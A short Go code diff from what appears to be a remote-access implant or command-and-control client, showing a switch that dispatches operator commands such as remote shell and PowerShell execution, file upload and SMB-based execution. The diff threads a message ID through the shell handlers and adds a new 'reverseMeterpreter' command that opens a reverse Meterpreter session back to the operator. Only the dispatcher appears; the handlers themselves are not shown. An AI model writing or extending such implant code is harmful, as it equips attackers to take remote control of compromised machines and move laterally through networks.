@@ -10,15 +10,17 @@ func Start() {
 		select {
 		case message := <-setchannel.CmdMsgChan:
 			msg, sendUserId, decData := common.SettleRetData(message)
+			msgId := common.GetMsgId(message)
+
 			switch msg {
 			case "closeClient":
 				go closeClientCmd()
 				break
 			case "execShell":
-				go shellCmd(sendUserId, decData)
+				go shellCmd(sendUserId, decData, msgId)
 				break
 			case "execPowershell":
-				go powershellCmd(sendUserId, decData)
+				go powershellCmd(sendUserId, decData, msgId)
 				break
 			case "fileUpload":
 				go fileUploadCmd(sendUserId, decData)
@@ -83,7 +85,9 @@ func Start() {
 			case "smbExec":
 				go smbExecCmd(sendUserId, decData)
 				break
-
+			case "reverseMeterpreter":
+				go reverseMeterpreterCmd(sendUserId, decData)
+				break
 			default:
 				break
 			}
